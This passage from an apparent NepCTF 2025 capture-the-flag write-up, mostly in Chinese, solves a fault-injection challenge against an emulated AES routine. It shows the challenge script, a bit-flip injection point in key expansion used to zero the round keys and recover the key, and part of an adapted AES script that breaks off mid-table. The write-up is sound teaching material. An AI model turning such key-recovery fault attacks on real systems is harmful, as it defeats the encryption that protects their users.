class="hljs-number">0x9E5</span><br>ENTRY_POINT_END = CODE_ADDRESS + <span class="hljs-number">0xF6F</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flipBit</span>(<span class="hljs-params">uc:Uc,reg_name:<span class="hljs-built_in">str</span></span>):<br>    randBit = random.randint(<span class="hljs-number">0</span>,<span class="hljs-number">7</span>) <span class="hljs-comment">#not 0,63</span><br>    reg_num = <span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;UC_X86_REG_&quot;</span> + reg_name.upper())<br>    reg_value = uc.reg_read(reg_num)<br>    reg_value ^= <span class="hljs-number">1</span> &lt;&lt; randBit<br>    uc.reg_write(reg_num,reg_value)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">shock</span>(<span class="hljs-params">uc:Uc</span>):<br>    rip = uc.reg_read(UC_X86_REG_RIP)<br>    code = uc.mem_read(rip,<span class="hljs-number">16</span>)<br>    md = Cs(CS_ARCH_X86, CS_MODE_64)<br>    md.detail = <span class="hljs-literal">True</span><br>    dis = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> md.disasm(code, <span class="hljs-number">0</span>):<br>        dis = d<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">for</span> reg_list <span class="hljs-keyword">in</span> dis.regs_access():<br>        <span class="hljs-keyword">for</span> reg <span class="hljs-keyword">in</span> reg_list:<br>            flipBit(uc,md.reg_name(reg))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hook_code</span>(<span class="hljs-params">uc:Uc, address, size, user_data</span>):<br>    <span class="hljs-keyword">global</span> CODE_COUNT<br>    <span class="hljs-keyword">if</span>(CODE_COUNT &gt;= <span class="hljs-number">2000000</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   [⏰] Time Limit Exceed&quot;</span>)<br>        uc.emu_stop()<br>    <span class="hljs-keyword">if</span>(CODE_COUNT == TARGET_COUNT):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   [⚡] Shock!&quot;</span>)<br>        shock(uc)<br>    CODE_COUNT += <span class="hljs-number">1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">data,key,target</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   [🔒] to enc: &quot;</span>,data.<span class="hljs-built_in">hex</span>())<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">global</span> CODE_COUNT<br>        <span class="hljs-keyword">global</span> TARGET_COUNT<br>        CODE_COUNT = <span class="hljs-number">0</span><br>        TARGET_COUNT = target<br>        <span class="hljs-comment"># Initialize emulator </span><br>        mu = Uc(UC_ARCH_X86, UC_MODE_64)<br><br>        <span class="hljs-comment"># map memory</span><br>        mu.mem_map(CODE_ADDRESS, <span class="hljs-number">2</span> * <span class="hljs-number">0x1000</span>) <span class="hljs-comment"># Code</span><br>        mu.mem_map(DATA_ADDRESS, <span class="hljs-number">1</span> * <span class="hljs-number">0x1000</span>) <span class="hljs-comment"># DATA</span><br>        mu.mem_map(KEY_ADDRESS, <span class="hljs-number">1</span> * <span class="hljs-number">0x1000</span>) <span class="hljs-comment"># KEY</span><br>        mu.mem_map(STACK_ADDRESS, <span class="hljs-number">2</span> * <span class="hljs-number">0x1000</span>) <span class="hljs-comment"># STACK</span><br>        <span class="hljs-comment"># write machine code to be emulated to memory</span><br><br>        mu.mem_write(CODE_ADDRESS, CODE)<br>        mu.mem_write(KEY_ADDRESS, key)<br>        mu.mem_write(DATA_ADDRESS, data)<br><br>        <span class="hljs-comment"># initialize machine registers</span><br>        mu.reg_write(UC_X86_REG_RIP, ENTRY_POINT)<br>        mu.reg_write(UC_X86_REG_RDI, DATA_ADDRESS)<br>        mu.reg_write(UC_X86_REG_RSI, <span class="hljs-number">16</span>)<br>        mu.reg_write(UC_X86_REG_RDX, KEY_ADDRESS)<br>        mu.reg_write(UC_X86_REG_RSP, STACK_ADDRESS + <span class="hljs-number">0x1000</span>)<br><br>        <span class="hljs-comment"># tracing all instructions with customized callback</span><br>        mu.hook_add(UC_HOOK_CODE, hook_code)<br><br>        <span class="hljs-comment"># emulate machine code in infinite time</span><br>        mu.emu_start(ENTRY_POINT, ENTRY_POINT_END)<br><br>        result = mu.mem_read(DATA_ADDRESS, <span class="hljs-number">16</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   [▶️] Result: &quot;</span>,result.<span class="hljs-built_in">hex</span>())<br><br>    <span class="hljs-keyword">except</span> UcError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   [💥] BOOM: %s&quot;</span> % e) <span class="hljs-comment"># https://www.bilibili.com/video/BV1ynKQzHEED</span><br>    <span class="hljs-keyword">return</span><br><br><br>AES_KEY = os.urandom(<span class="hljs-number">16</span>)<br>AES_PTS = <span class="hljs-string">b&#x27;&#x27;</span><br>Shocktime = <span class="hljs-number">9999999</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    count=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> count &lt; <span class="hljs-number">1</span>:<br>        count += <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Round %d / 1&quot;</span>%(count))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Input your data: in hex(max 16 bytes)&quot;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            AES_PTS = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">input</span>())[<span class="hljs-number">0</span>:<span class="hljs-number">16</span>]<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;wrong input!&quot;</span>)<br>            sys.exit(<span class="hljs-number">1</span>)<br>        Shocktime=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;time to shock: &quot;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            Shocktime=<span class="hljs-built_in">int</span>(Shocktime)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;wrong input!&quot;</span>)<br>            sys.exit(<span class="hljs-number">1</span>)<br>        run(AES_PTS,AES_KEY,Shocktime)    <br>        guesskey=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;now give me your guess key: &quot;</span>)<br>        <span class="hljs-keyword">if</span> guesskey[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;n&quot;</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">try</span>:<br>            guesskey=<span class="hljs-built_in">bytes</span>.fromhex(guesskey)[<span class="hljs-number">0</span>:<span class="hljs-number">16</span>]<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;wrong input!&quot;</span>)<br>            sys.exit(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> guesskey==AES_KEY:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;FLAG:&quot;</span>,flag)<br>            sys.exit(<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No Second Chance&quot;</span>)<br>            sys.exit(<span class="hljs-number">1</span>)<br><br></code></pre></td></tr></table></figure><p><strong>分析：</strong><br>故障注入攻击，分析题目，跟MISC中的<code>easyshock</code>比较相似，其中的<code>shock</code>逻辑是一样的，这一题的交互逻辑和题目都在提示我们跟密钥泄露有关，只要求出<code>key</code>我们就能得到<code>FLAG</code>。<br>使用IDA逆向一下<code>progaes4</code>，发现是AES加密算法，逐个分析函数之后，发现函数<code>sub_1BC</code>控制着密钥扩展逻辑，根据我们了解的AES相关知识可以知道，扩展密钥由十一组组成，每组由4个4字节组成，其中第一组就是原始密钥。<br><img src="/2025/07/25/NepCTF%202025%20Writeup/file-20250807234644320.png"><br>由于我们可以自定义加密明文，也就是说，我们的目的就是通过修改密钥扩展算法，再结合明文和密钥的关系来获取密钥。通过分析我们可以通过修改<code>i</code>的大小，让<code>i</code>直接跳过do-while，这样扩展密钥就会变成除了第一组是原始密钥<code>key</code>，其他10组都默认为0，这样的话我们就能用来生成扩展密钥为全<code>0</code>进行解密，最后再异或一下明文<code>m</code>就能得到<code>key</code>。<br>首先我们要找到对应的注入点，通过查看该函数的汇编指令，找到扩展密钥初始化时<code>++i</code>的指令<br><img src="/2025/07/25/NepCTF%202025%20Writeup/file-20250807235637972.png"><br>找到相对地址为<code>0x207</code>，然后在<code>hook_code</code>中添加以下代码来获取对应的故障注入点：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span>(address == CODE_ADDRESS + <span class="hljs-number">0x207</span>):<br>    <span class="hljs-built_in">print</span>(CODE_COUNT)<br></code></pre></td></tr></table></figure><p>运行题目所给脚本，取最后一个<code>CODE_COUNT</code>作为<code>Shocktime</code><br><img src="/2025/07/25/NepCTF%202025%20Writeup/file-20250807235830838.png"><br>得到<code>Shocktime</code>为90，之后便可以进行注入了，首先我们要有一个能够自定义轮密钥的AES解密脚本，在网上随便找了一个：<a href="https://wuuconix.link/2021/10/08/aes/">AES 加解密 python手动实现 - wuuconix’s blog</a><br>稍微对脚本进行修改，写一个生成全0的轮密钥生成函数，并将解密的输出结果调整一下，解密脚本为：<br><code>aes.py</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> copy<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mul</span>(<span class="hljs-params">poly1, poly2</span>):   <span class="hljs-comment"># 两个多项式相乘</span><br>result = <span class="hljs-number">0</span>  <br><span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(poly2.bit_length()):<br><span class="hljs-keyword">if</span> poly2 &amp; (<span class="hljs-number">1</span> &lt;&lt; index):<br>result ^= (poly1 &lt;&lt; index)<br><span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mod</span>(<span class="hljs-params">poly, mod = <span class="hljs-number">0b100011011</span></span>):    <span class="hljs-comment"># 多项式poly模多项式100011011</span><br><span class="hljs-keyword">while</span> poly.bit_length() &gt; <span class="hljs-number">8</span>:  <br>poly ^= (mod &lt;&lt; (poly.bit_length() - <span class="hljs-number">9</span>))<br><span class="hljs-keyword">return</span> poly<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">substitute</span>(<span class="hljs-params">m_hex, inverse=<span class="hljs-literal">False</span></span>):<br>    m_s = []<br>    box = s_box <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> inverse <span class="hljs-keyword">else</span> i_s_box<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> m_hex:<br>        x, y = <span class="hljs-built_in">int</span>(i, <span class="hljs-number">16</span>) // <span class="hljs-number">16</span>, <span class="hljs-built_in">int</span>(i, <span class="hljs-number">16</span>) % <span class="hljs-number">16</span><br>        temp = <span class="hljs-built_in">hex</span>(box[x*<span class="hljs-number">16</span>+y])<br>        m_s.append(temp)<br>    <span class="hljs-keyword">return</span> m_s<br><br>s_box =   [<span class="hljs-number">0x63</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x16</span>]<br>i_s_box = [<span class="hljs-number">0x52</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x9C</span>, <span 